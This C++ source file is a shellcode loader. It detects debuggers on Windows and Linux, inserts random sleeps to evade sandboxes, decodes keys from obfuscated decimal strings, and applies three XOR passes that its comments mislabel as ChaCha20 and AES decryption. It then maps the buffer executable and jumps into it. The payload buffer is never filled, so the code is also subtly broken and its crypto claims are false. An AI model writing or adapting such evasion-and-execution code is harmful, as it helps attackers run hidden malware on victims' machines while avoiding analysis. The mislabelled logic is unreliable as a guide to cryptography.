#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool cmpRunner1521() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> coreExecutor9923(const std::string& dec, size_t len) {
    std::vector<uint8_t> bytes(len, 0);
    std::string num = dec;
    for (int i = len - 1; i >= 0 && num != "0"; i--) {
        int remainder = 0;
        std::string quotient;
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        bytes[i] = remainder;
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    return bytes;
}

int main() {
    // Random delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (cmpRunner1521()) return 0;

    std::vector<uint8_t> valFactory7668;
    // Decrypt payload
    const char* ctxCore9724 = "123964457650663142486312748858176163304";
    auto valExecutor4139 = coreExecutor9923(ctxCore9724, 16);
    const char* hdlModule9234 = "100475325946305169897329577265941084854068553892567032701798651177006385816397";
    auto valUtil2156 = coreExecutor9923(hdlModule9234, 32);
    const char* loadModule1077 = "73852530752642233949317898695923462299224961308152";
    auto loadFactory1851 = coreExecutor9923(loadModule1077, 21);

    // Decrypt XOR layer
    for (size_t i = 0; i < valFactory7668.size(); i++) {
        valFactory7668[i] ^= loadFactory1851[i % loadFactory1851.size()];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < valFactory7668.size(); i++) {
        valFactory7668[i] ^= valUtil2156[i % valUtil2156.size()];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt AES layer
    for (size_t i = 0; i < valFactory7668.size(); i++) {
        valFactory7668[i] ^= valExecutor4139[i % valExecutor4139.size()];
    }

    // Execute in memory
#ifdef _WIN32
    void* coreComponent8791 = VirtualAlloc(0, valFactory7668.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!coreComponent8791) return 1;
    memcpy(coreComponent8791, valFactory7668.data(), valFactory7668.size());
    DWORD oldProtect;
    VirtualProtect(coreComponent8791, valFactory7668.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())coreComponent8791)();
#else
    void* coreComponent8791 = mmap(0, valFactory7668.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (coreComponent8791 == MAP_FAILED) return 1;
    memcpy(coreComponent8791, valFactory7668.data(), valFactory7668.size());
    mprotect(coreComponent8791, valFactory7668.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())coreComponent8791)();
#endif
    // Clear memory
    memset(coreComponent8791, 0, valFactory7668.size());
    return 0;
}
